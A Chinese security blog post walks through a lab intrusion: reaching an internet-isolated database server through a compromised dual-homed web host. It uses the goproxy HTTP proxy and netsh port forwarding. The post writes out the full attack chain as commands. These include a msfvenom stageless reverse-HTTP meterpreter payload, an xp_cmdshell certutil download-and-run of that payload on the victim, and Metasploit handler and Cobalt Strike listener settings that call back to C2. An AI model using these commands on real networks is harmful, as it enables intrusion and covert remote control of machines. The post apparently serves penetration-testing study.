##  利用goproxy http上线不出网主机

原创 3had0w  [ 潇湘信安 ](javascript:void\(0\);)

**潇湘信安** ![]()

微信号 xxxasec

功能介绍 一个不会编程、挖SRC、代码审计的安全爱好者，主要分享一些安全经验、渗透思路、奇淫技巧与知识总结。

____

__

收录于话题

#内网安全 31

#安全工具 46

#MSF 19

**声明：**
该公众号大部分文章来自作者日常学习笔记，也有少部分文章是经过原作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。  
---  
  
  

我们接着上篇文章“[利用MSF上线断网主机的思路分享](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247490086&idx=1&sn=14525c41cd3990554b324faec7364e72&chksm=cfa6be35f8d1372348f13148276b848ee0641364c99575233f0b6186f35ce73c5e15328208c1&scene=21#wechat_redirect)”继续来分享一篇如何使用goproxy
http代理方式上线不出网主机的利用姿势，结合上篇文章阅读更佳！！！

  

项目地址：https://github.com/snail007/goproxy

  

 **0x01 测试环境**

  *   *   * 

    
    
     攻击机（Kali）：192.168.56.101受害机1（Web）：192.168.56.102、192.168.186.3 - 双网卡受害机2（Data）：192.168.186.4 - 断网机

  

 **0x02 goproxy http代理上线MSF/CS**

我们先将goproxy项目的proxy.exe工具通过中国菜刀上传至目标磁盘可读写目录中，执行以下命令在这台出网主机上开启一个8080端口的HTTP代理供后期与不出网主机进行通讯。  

  * 

    
    
    C:\ProgramData\proxy.exe http -t tcp -p "0.0.0.0:8080" --daemon

![](https://gitee.com/fuli009/images/raw/master/public/20210810121123.png)  

0.0.0.0/127.0.0.1区别：

  *   * 

    
    
    0.0.0.0：本机上的所有IPV4地址；127.0.0.1：环回地址，仅本地接口IP地址；

  

这一步可直接省略跳过

然后再利用系统自带的netsh命令将这台主机56出网段的HTTP代理8080端口转发至186不出网段的8888端口上，用于后期在MSF监听时设置HTTP代理。

  *   *   *   *   *   *   *   * 

    
    
    添加端口转发netsh interface portproxy add v4tov4 listenaddress=192.168.186.3 listenport=8888 connectaddress=192.168.56.102 connectport=8080  
    删除端口转发netsh interface portproxy delete v4tov4 listenaddress=192.168.186.3 listenport=8888  
    显示所有端口转发netsh interface portproxy show all

![](https://gitee.com/fuli009/images/raw/master/public/20210810121128.png)  

用msfvenom命令生成个`meterpreter_reverse_http`载荷文件，需要加上以下几个HTTP代理参数，填入186不出网段内网IP的HTTP代理：http://192.168.186.3:8080

  * `HttpProxyType`：代理类型（HTTP）；

  * `HttpProxyHost`：代理地址（192.168.186.3）；

  * `HttpProxyPort`：代理端口（8080）；

  * 

    
    
    msfvenom -p windows/x64/meterpreter_reverse_http LHOST=192.168.56.101 LPORT=443 HttpProxyType=HTTP HttpProxyHost=192.168.186.3 HttpProxyPort=8080 -f exe > /tmp/stageless.exe

![](https://gitee.com/fuli009/images/raw/master/public/20210810121129.png)  

利用中国菜刀的上传/下载功能将该文件放至192.168.186.3的Web服务器中供192.168.186.4断网数据库服务器下载，执行以下命令将`stageless.exe`下载至断网机磁盘中。

  * 

    
    
    EXEC master..xp_cmdshell 'certutil -urlcache -split -f http://192.168.186.3/stageless.exe C:\ProgramData\stageless.exe'

![](https://gitee.com/fuli009/images/raw/master/public/20210810121130.png)  

handler监听模块这里必须也要用`meterpreter_reverse_http`，配置好相关选项后执行监听，然后在中国菜刀中利用xp_cmdshell组件执行`stageless.exe`后即可成功上线。‍

  *   *   *   *   *   *   *   *   *   * 

    
    
    msf5 > use exploit/multi/handlermsf5 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_httpmsf5 exploit(multi/handler) > set lhost 192.168.56.101msf5 exploit(multi/handler) > set lport 443msf5 exploit(multi/handler) > set httpproxytype HTTPmsf5 exploit(multi/handler) > set httpproxyhost 192.168.186.3msf5 exploit(multi/handler) > set httpproxyport 8080msf5 exploit(multi/handler) > exploit  
    EXEC master..xp_cmdshell 'C:\ProgramData\stageless.exe'

![]()  
  
流量走向如下：

  *   * 

    
    
    192.168.186.4->192.168.186.3(192.168.56.102):8080->C2192.168.186.4->192.168.186.3:8888->192.168.56.102:8080->C2

  

`httpproxytype、httpproxyhost、httpproxyport`这几个高级参数选项在`options`命令中是看不到的，需要用`advanced`命令才可看到，如下图。

![](https://gitee.com/fuli009/images/raw/master/public/20210810121131.png)  

如需上线至CobaltStrike则可以创建一个新的监听器，有效载荷选择为Beacon HTTP，在HTTP
Proxy处填写代理地址：http://192.168.186.3:8080。

  

将在`Windows Executable(S)`生成的可执行马儿文件上传/下载至192.168.186.4断网数据库服务器中执行即可成功上线。

![](https://gitee.com/fuli009/images/raw/master/public/20210810121133.png)

  

 **注意事项：**

利用这种方式上线不出网主机时得注意下，生成MSF文件和设置监听时必须使用stageless Payload，而CS则必须要使用Windows
Executable(S)，否则其他马儿即使执行成功也不会上线。

  *   *   *   *   * 

    
    
    stager：分阶段，第一阶段申请内存，第二阶段向C2发起请求并接受shellcode执行；windows/x64/meterpreter/reverse_http  
    stageless：不分阶段，生成时就包含了所有文件，可以避免shellcode传输不畅造成目标无法上线；windows/x64/meterpreter_reverse_http

  

* * *

  
关注公众号回复“9527”可免费获取一套HTB靶场文档和视频，“1120”安全参考等安全杂志PDF电子版，“1208”个人常用高效爆破字典，“0221”2020年酒仙桥文章打包，还在等什么？赶紧点击下方名片关注学习吧！

* * *

 **推 荐 阅 读**

  
  
  
[![](https://gitee.com/fuli009/images/raw/master/public/20210810121134.png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247487086&idx=1&sn=37fa19dd8ddad930c0d60c84e63f7892&chksm=cfa6aa7df8d1236bb49410e03a1678d69d43014893a597a6690a9a97af6eb06c93e860aa6836&scene=21#wechat_redirect)[![](https://gitee.com/fuli009/images/raw/master/public/20210810121135.png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486961&idx=1&sn=d02db4cfe2bdf3027415c76d17375f50&chksm=cfa6a9e2f8d120f4c9e4d8f1a7cd50a1121253cb28cc3222595e268bd869effcbb09658221ec&scene=21#wechat_redirect)[![]()](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486327&idx=1&sn=71fc57dc96c7e3b1806993ad0a12794a&chksm=cfa6af64f8d1267259efd56edab4ad3cd43331ec53d3e029311bae1da987b2319a3cb9c0970e&scene=21#wechat_redirect)

* * *

 **欢 迎 私 下 骚 扰**

  
  
![](https://gitee.com/fuli009/images/raw/master/public/20210810121136.png)

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读原文

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

利用goproxy http上线不出网主机

最多200字，当前共字

__

发送中

写下你的留言

微信扫一扫  
关注该公众号

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

[知道了](javascript:;)

**长按识别前往小程序**

![]()

